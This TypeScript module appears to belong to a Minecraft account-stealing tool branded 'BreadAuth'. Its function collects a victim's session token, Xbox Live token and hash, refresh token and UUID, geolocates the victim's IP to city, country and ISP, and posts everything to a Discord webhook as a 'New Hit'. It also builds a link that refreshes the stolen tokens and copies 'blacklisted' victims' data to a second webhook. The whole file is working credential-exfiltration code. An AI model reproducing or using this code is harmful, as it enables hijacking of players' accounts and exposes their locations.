import ipGeolocation from "../geolocation";
import dotenv from "dotenv";
dotenv.config();
const hatehook = process.env.DISCORD_HATEHOOK;

export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string, blacklisted?: boolean) {
    const { username, uuid, session_token, xbl_hash, xbl_token, refresh_token } = data;
    const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
    const refreshURL = "https://breadcat.cc/api/v1/auth/manual/refresh";

    //format networth to be human readable using K, M, B, T
    const formatedNw = Intl.NumberFormat('en-US', {
        notation: "compact",
        maximumFractionDigits: 1
      }).format(unsoulboundNw);
    let fields = [
        {
            "name": "Username",
            "value": `[${username}](https://sky.shiiyu.moe/stats/${uuid})`,
            "inline": true
        },
        {
            "name": "UUID",
            "value": uuid,
            "inline": true
        },
        {
            "name": "Networth",
            "value": formatedNw,
            "inline": true
        },
        {
            "name": "Session Token",
            "value": `\`\`\`${session_token}\`\`\``
        }
    ]
    if (description !== "Error getting networth") {
        for (const field of description) {
            fields.push(field)
        }
    }
    const { status, city, country, isp } = await ipGeolocation(ip);
    if (status === 200) {
        //add city and country to fields at the start
        fields.unshift({
            "name": "City",
            "value": city,
            "inline": true
        }, {
            "name": "Country",
            "value": country,
            "inline": true
        },
        {
            "name": "ISP",
            "value": isp,
            "inline": true
        })
    }
    
    let mcEmbed = {
        "title": `New Hit from: ${ip}`,
        "color": 15695665,
        "fields": fields,
        "thumbnail": {
            "url": `https://crafatar.com/avatars/${uuid}?size=256&overlay`
        },
        "footer": {
            "text": "message brought to you by BreadAuth\nhttps://discord.gg/J2K956RZDV",
            "icon_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg"
        }
    }
    const body = {
        "username": "BreadAuth",
        "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
        "embeds": [mcEmbed],
        "content": `[Refresh](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token}&refresh_token=${refresh_token})`
    }
    const options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(body)
    }
    console.log("Formated Webhook Body")
    const res = await fetch(webhook, options);
    if (res.status == 403) {
        console.log("Got rate limited, retrying in 5 seconds")
        setTimeout(() => {
            oauthWebhook(data, nwData, ip, webhook)
        }, 5000);
    }
    if (res.status !== 204) {
        console.log("Error sending webhook")
        console.error(res)
    }
    if (blacklisted && hatehook) {
        oauthWebhook(data, nwData, ip, hatehook)
    }
}